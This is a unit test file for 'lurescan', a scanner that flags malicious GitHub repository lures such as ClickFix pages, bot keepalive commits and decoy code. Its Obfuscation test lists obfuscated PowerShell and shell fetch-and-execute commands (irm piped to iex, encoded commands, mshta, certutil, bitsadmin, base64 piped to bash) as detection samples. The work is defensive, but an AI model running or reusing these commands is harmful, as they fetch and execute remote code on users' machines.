"""Tests for lurescan. Run with: python3 -m unittest discover -s tests"""
import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import lurescan as L  # noqa: E402

FIXTURES = os.path.join(ROOT, "tests", "fixtures")

# Filled into the fixtures only in a temporary copy, so the repo never holds a working lure.
PLACEHOLDERS = {
    "@@OBF_IEX@@": "&('i'+'e'+'x')",
    "@@RUN_DIALOG@@": "<kbd>Win</kbd> + <kbd>R</kbd>",
}


def materialize(name, tmp):
    dest = os.path.join(tmp, name)
    shutil.copytree(os.path.join(FIXTURES, name), dest)
    for dirpath, _dirs, files in os.walk(dest):
        for fn in files:
            path = os.path.join(dirpath, fn)
            with open(path, encoding="utf-8") as fh:
                text = fh.read()
            for k, v in PLACEHOLDERS.items():
                text = text.replace(k, v)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
    return dest


def git(cwd, *args, env=None):
    full_env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_SYSTEM=os.devnull)
    full_env.update(env or {})
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, env=full_env)


def make_repo(src, commits):
    """Turn a directory into a git repo. commits: list of (author, email, iso_date, message)."""
    git(src, "init", "-q", "-b", "main")
    for i, (author, email, date, message) in enumerate(commits):
        with open(os.path.join(src, ".commit-log"), "a", encoding="utf-8") as fh:
            fh.write(f"{i}\n")
        git(src, "add", "-A")
        env = {"GIT_AUTHOR_NAME": author, "GIT_AUTHOR_EMAIL": email, "GIT_AUTHOR_DATE": date,
               "GIT_COMMITTER_NAME": author, "GIT_COMMITTER_EMAIL": email, "GIT_COMMITTER_DATE": date}
        git(src, "commit", "-q", "-m", message, env=env)
    return src


BOT = ("github-actions[bot]", "41898282+github-actions[bot]@users.noreply.github.com")


def ids(report):
    return {f.id for f in report.findings}


class TmpCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="lurescan-test-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


class RandomNames(unittest.TestCase):
    RANDOM = ["RBerAZirJwdLsk", "AeMyXoDpEbkO", "CCCqfADNIwghTDQ", "hlvDpznGLLTus", "nujYNoLOYFh",
              "hTOdRWdBSrUyLWRm", "SvMfmqeBFsL", "qhNWWEHHIoTAQ", "PlIXLUZYkiGtV", "gMCLYKHKmFOHY"]
    NORMAL = ["BuildAndTest", "CodeQLAnalysis", "PullRequestTemplate", "NightlyBuild", "DeployToAzure",
              "MacOSRelease", "ReleaseDrafter", "CODEOWNERS", "dependabot", "GenerateChangelog",
              "WelcomeNewContributors", "TranslateDocs", "GitHubPages", "PyPIPublish", "dotnetDesktop",
              "ISSUE_TEMPLATE", "NuGetPublish", "WinGetSubmit", "smart-rabbits-swim"]

    def test_random_names_are_caught(self):
        self.assertEqual([n for n in self.RANDOM if not L.looks_random(n)], [])

    def test_real_names_pass(self):
        self.assertEqual([n for n in self.NORMAL if L.looks_random(n)], [])


class Obfuscation(unittest.TestCase):
    BAD = [
        "powershell -c \"(irm 'https://example.invalid')|&('i'+'e'+'x')\"",
        "irm https://example.invalid | i`e`x",
        "iex(irm(-join'divni.elpmaxe//:sptth'[-1..-99]))",
        "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8=')))",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        "mshta https://example.invalid/x.hta",
        "certutil -f -urlcache https://example.invalid/a.exe a.exe",
        "bitsadmin /transfer job https://example.invalid/a.exe C:\\a.exe",
        "powershell -w hidden -c irm https://example.invalid | iex",
        "&( $env:comspec[4,15,25]-join'') (irm https://example.invalid)",
        "&(gcm i*x) (irm https://example.invalid)",
        "echo aGVsbG8= | base64 -d | bash",
    ]
    GOOD = [
        "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
        "curl -fsSL https://bun.sh/install | bash",
        "```powershell\ncurl.exe -x http://127.0.0.1:7897 https://example.invalid\n```",
        "Run `curl` or `Invoke-Expression` carefully.",
        "iex is short for Invoke-Expression.",
    ]

    def findings_for(self, text):
        snap = L.DirSnapshot.__new__(L.DirSnapshot)
        snap.name, snap.owner, snap.meta, snap.files, snap.commits = "t/t", "t", {}, ["README.md"], None
        return L.check_pages(snap, {"README.md": text}, few_source=True)

    def test_obfuscated_forms_are_caught(self):
        missed = [t for t in self.BAD if not any(f.id == "obfuscated-command" for f in self.findings_for(t))]
        self.assertEqual(missed, [])

    def test_plain_installers_pass(self):
        flagged = [t for t in self.GOOD if self.findings_for(t)]
        self.assertEqual(flagged, [])


class LureFixtures(TmpCase):
    def test_clickfix(self):
        path = materialize("clickfix", self.tmp)
        rep = L.scan(L.DirSnapshot(path, name="fixture-owner/example-studio-pro-win"))
        self.assertEqual(rep.verdict, "lure")
        self.assertTrue({"clickfix-page", "obfuscated-command", "setup-button", "no-code-product"} <= ids(rep), ids(rep))

    def test_clickfix_without_placeholders_is_not_a_working_lure(self):
        # The fixture as stored in the repo has no obfuscated iex and no Win+R step.
        rep = L.scan(L.DirSnapshot(os.path.join(FIXTURES, "clickfix"), name="fixture-owner/x"))
        self.assertNotIn("clickfix-page", ids(rep))
        self.assertNotIn("obfuscated-command", ids(rep))

    def test_keepalive_with_history(self):
        path = materialize("keepalive", self.tmp)
        msgs = ["remove fix #9556", "monitor encrypt #6851", "remove bug #5095", "adjust remove #7065",
                "export review #7174", "add update #1234"]
        commits = [("fixture-owner", "fixture@example.invalid", "2026-11-21T13:00:00Z", "Initial commit")]
        commits += [(*BOT, f"2026-11-21T{14 + i:02d}:00:00Z", m) for i, m in enumerate(msgs)]
        make_repo(path, commits)
        rep = L.scan(L.GitSnapshot(path, name="fixture-owner/example-forensic-suite"))
        self.assertEqual(rep.verdict, "lure")
        self.assertTrue({"keepalive-commits", "cloaked-page", "random-names", "setup-button"} <= ids(rep), ids(rep))
        keep = next(f for f in rep.findings if f.id == "keepalive-commits")
        self.assertTrue(any(e.startswith("history: 6 recent bot commits") for e in keep.evidence), keep.evidence)

    def test_decoy_code(self):
        path = materialize("decoy-code", self.tmp)
        rep = L.scan(L.DirSnapshot(path, name="fixture-owner/example-racer-mod-portable-x64"))
        self.assertEqual(rep.verdict, "lure")
        self.assertTrue({"heartbeat-commits", "binary-only", "no-code-product"} <= ids(rep), ids(rep))
        self.assertTrue(rep.checked["no_real_code"])

    def test_binary_only_needs_metadata_to_be_a_lure(self):
        path = materialize("binary-only", self.tmp)
        offline = L.scan(L.DirSnapshot(path, name="fixture-owner/example-blender-mcp"))
        self.assertEqual(offline.verdict, "suspicious")
        meta = {"stars": 2746, "created_at": "2026-11-19T10:00:00Z", "checked_at": "2026-11-23T10:00:00Z",
                "owner_created_at": "2026-11-18T22:00:00Z"}
        online = L.scan(L.DirSnapshot(path, name="fixture-owner/example-blender-mcp", meta=meta))
        self.assertEqual(online.verdict, "lure")
        self.assertTrue({"star-burst", "fresh-owner"} <= ids(online), ids(online))

    def test_backdated_history(self):
        path = materialize("clickfix", self.tmp)
        o = ("fixture-owner", "fixture@example.invalid")
        make_repo(path, [(*o, "2026-11-21T17:47:15+01:00", "initial commit"),
                         (*o, "2026-11-04T09:46:00Z", "add LICENSE and CHANGELOG"),
                         (*o, "2026-11-14T14:46:00Z", "assets: add preview and buttons"),
                         (*o, "2026-11-20T10:46:00Z", "page: initial site"),
                         (*o, "2026-11-21T15:52:00Z", "docs: full README")])
        rep = L.scan(L.GitSnapshot(path, name="fixture-owner/example-studio-pro-win"))
        self.assertIn("backdated-history", ids(rep))
        ev = next(f for f in rep.findings if f.id == "backdated-history").evidence[0]
        self.assertTrue(ev.startswith("3 commits"), ev)

    def test_evidence_is_defanged(self):
        for name in ("clickfix", "keepalive", "decoy-code", "binary-only"):
            path = materialize(name, os.path.join(self.tmp, name))
            rep = L.scan(L.DirSnapshot(path, name=f"fixture-owner/{name}"))
            for f in rep.findings:
                for e in f.evidence:
                    self.assertNotRegex(e, r"(?i)https?://", f"{name}/{f.id}")


class LegitFixtures(TmpCase):
    def test_legit_lookalikes_pass(self):
        for name in ("legit-installer", "legit-changesets", "legit-staticrypt", "legit-readme-only", "legit-scraper"):
            path = materialize(name, os.path.join(self.tmp, name))
            rep = L.scan(L.DirSnapshot(path, name=f"someone/{name}"))
            self.assertEqual(rep.verdict, "no-known-signs", (name, [f.as_dict() for f in rep.findings]))

    def test_git_scraper_bot_commits_are_not_keepalive(self):
        path = materialize("legit-scraper", self.tmp)
        commits = [("someone", "s@example.invalid", "2026-11-01T00:00:00Z", "Initial commit")]
        commits += [(*BOT, f"2026-11-01T{1 + i:02d}:06:00Z", f"Latest data: Sun Nov  1 {1 + i:02d}:06:00 UTC 2026")
                    for i in range(10)]
        make_repo(path, commits)
        rep = L.scan(L.GitSnapshot(path, name="someone/example-fires-history"))
        self.assertNotIn("keepalive-commits", ids(rep))
        self.assertEqual(rep.verdict, "no-known-signs")

    def test_lurescan_does_not_flag_itself(self):
        # Its README describes obfuscated commands; a real codebase keeps that from adding up.
        rep = L.scan(L.DirSnapshot(ROOT, name="DU8866-nice/lurescan"))
        self.assertEqual(rep.verdict, "no-known-signs", [f.as_dict() for f in rep.findings])


class Cli(TmpCase):
    def run_main(self, *argv):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = L.main(list(argv))
        return code, out.getvalue()

    def test_parse_target(self):
        self.assertEqual(L.parse_target("owner/repo"), ("github", "owner/repo"))
        self.assertEqual(L.parse_target("https://github.com/owner/repo.git"), ("github", "owner/repo"))
        self.assertEqual(L.parse_target("https://github.com/owner/repo/"), ("github", "owner/repo"))
        self.assertEqual(L.parse_target("git@github.com:owner/my.repo.git"), ("github", "owner/my.repo"))
        self.assertEqual(L.parse_target("not a repo")[0], "bad")

    def test_exit_codes_and_json(self):
        lure = materialize("clickfix", self.tmp)
        legit = materialize("legit-installer", self.tmp)
        code, out = self.run_main(lure, legit, "--json")
        self.assertEqual(code, 1)
        rows = [json.loads(l) for l in out.splitlines()]
        self.assertEqual([r["verdict"] for r in rows], ["lure", "no-known-signs"])
        self.assertEqual(self.run_main(legit)[0], 0)
        self.assertEqual(self.run_main("definitely not a repo")[0], 2)

    def test_strict_counts_suspicious(self):
        path = materialize("binary-only", self.tmp)
        self.assertEqual(self.run_main(path)[0], 0)
        self.assertEqual(self.run_main(path, "--strict")[0], 1)

    def test_text_output(self):
        code, out = self.run_main(materialize("clickfix", self.tmp))
        self.assertIn("LURE", out)
        self.assertIn("Do not run", out)


class Packaging(unittest.TestCase):
    def test_skill_copy_matches(self):
        with open(os.path.join(ROOT, "lurescan.py"), "rb") as a, \
                open(os.path.join(ROOT, "skills", "lurescan", "scripts", "lurescan.py"), "rb") as b:
            self.assertEqual(a.read(), b.read(), "run: cp lurescan.py skills/lurescan/scripts/")


if __name__ == "__main__":
    unittest.main()
